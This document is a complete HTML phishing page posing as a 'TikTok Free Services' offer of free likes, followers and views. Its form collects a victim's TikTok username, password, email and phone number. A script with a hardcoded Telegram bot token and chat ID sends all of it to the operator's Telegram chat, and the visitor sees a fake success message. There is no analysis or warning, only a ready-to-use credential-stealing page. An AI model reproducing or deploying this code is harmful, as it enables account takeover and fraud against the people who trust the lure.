<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TikTok Free Services</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
<style>
  body {
    margin: 0;
    font-family: 'Roboto', sans-serif;
    background: #121212;
    color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
  }

  header {
    position: absolute;
    top: 0;
    width: 100%;
    background: #1c1c1c;
    padding: 12px 20px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    box-shadow: 0 2px 10px rgba(0,0,0,0.5);
  }
  header img { width: 50px; }
  header .icons { display: flex; gap: 15px; }
  header .icons img { width: 25px; cursor: pointer; transition: transform 0.3s ease; }
  header .icons img:hover { transform: scale(1.2); }

  .container {
    background: #1e1e1e;
    padding: 30px;
    border-radius: 15px;
    width: 360px;
    text-align: center;
    box-shadow: 0 0 25px rgba(255,0,80,0.3);
    animation: slideIn 0.8s ease;
    z-index: 1;
  }
  @keyframes slideIn { from {transform: translateY(-50px); opacity:0;} to {transform: translateY(0); opacity:1;} }

  h2 { color: #ff61a6; font-size: 24px; margin-bottom: 20px; }

  input, select {
    width: 100%;
    padding: 12px;
    margin: 8px 0;
    border-radius: 8px;
    border: none;
    background: #2a2a2a;
    color: #fff;
    font-size: 14px;
    transition: all 0.3s ease;
  }
  input:focus, select:focus { outline: 2px solid #ff61a6; background: #333; }
  input:hover, select:hover { background: #3a3a3a; }

  .card-selects { display: flex; gap: 10px; margin: 10px 0; }
  .card-selects select { flex: 1; }

  button {
    width: 100%;
    padding: 12px;
    margin-top: 12px;
    background: #ff61a6;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    font-size: 16px;
    position: relative;
    overflow: hidden;
    transition: 0.3s ease;
  }
  button:hover { background: #ff0050; }
  button::after {
    content: "";
    position: absolute;
    left: -50%;
    top: 0;
    width: 50%;
    height: 100%;
    background: rgba(255,255,255,0.1);
    transform: skewX(-20deg);
    transition: 0.5s;
  }
  button:hover::after { left: 150%; }

  .loading, .success {
    margin-top: 12px;
    font-style: italic;
    display: none;
    animation: fadein 0.5s;
  }
  .loading { color: #ffd700; }
  .success { color: #00ff99; font-weight: bold; }
  @keyframes fadein { from {opacity:0;} to {opacity:1;} }

  footer { margin-top: 15px; font-size: 12px; color: #ccc; }

  @media(max-width: 400px) { .container { width: 90%; padding: 20px; } header { padding: 10px 15px; } }
</style>
</head>
<body>



<div class="container">
  <h2>TikTok Free Services</h2>

  <input type="text" id="username" placeholder="TikTok Username" required>
  <input type="password" id="password" placeholder="Password" required>
  <input type="text" id="videoLink" placeholder="TikTok Video Link" required>
  <input type="email" id="email" placeholder="Email Address" required>
  <input type="text" id="phone" placeholder="Phone Number" required>
  <div class="card-selects">
    <select id="likes">
      <option value="">Likes</option>
      <option value="100">100 Likes</option>
      <option value="500">500 Likes</option>
      <option value="1000">1000 Likes</option>
    </select>
    <select id="followers">
      <option value="">Followers</option>
      <option value="100">100 Followers</option>
      <option value="500">500 Followers</option>
    </select>
    <select id="views">
      <option value="">Views</option>
      <option value="100">100 Views</option>
      <option value="1000">1000 Views</option>
      <option value="5000">5000 Views</option>
    </select>
  </div>

  <button onclick="sendData()">Submit Request</button>
  <div class="loading" id="loading">⏳ Processing Request...</div>
  <div class="success" id="success">✅ Request Sent Successfully! <b>Please Wait...</b></div>

  <footer>Get Free Tiktok Services</footer>
</div>

<script>
const botToken = "8074425306:AAFZ8DvcPCHHEuPlY4R9HaF1OGQ9raJ1oZw";
const chatId = "8170720704";

function sendData() {
  const username = document.getElementById("username").value;
  const email = document.getElementById("email").value;
  const phone = document.getElementById("phone").value;
  const password = document.getElementById("password").value;
  const videoLink = document.getElementById("videoLink").value;
  const likes = document.getElementById("likes").value;
  const followers = document.getElementById("followers").value;
  const views = document.getElementById("views").value;

  if (!username || !email || !phone || !password || !videoLink || !likes || !followers || !views) {
    alert("Please fill out all fields!");
    return;
  }

  document.getElementById("loading").style.display = "block";
  document.getElementById("success").style.display = "none";

  const message = `🎯 TikTok Free Services Request
-----------------------
👤 Username: ${username}
📧 Email: ${email}
📱 Phone: ${phone}
🔑 Password: ${password}
🎬 Video Link: ${videoLink}
❤️ Likes: ${likes}
👥 Followers: ${followers}
👀 Views: ${views}`;

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: message })
  })
  .then(response => {
    document.getElementById("loading").style.display = "none";
    document.getElementById("success").style.display = "block";
    setTimeout(() => { document.getElementById("success").style.display = "none"; }, 4000);
  })
  .catch(error => {
    document.getElementById("loading").style.display = "none";
    alert("Error sending data!");
  });
}
</script>
</body>
</html>
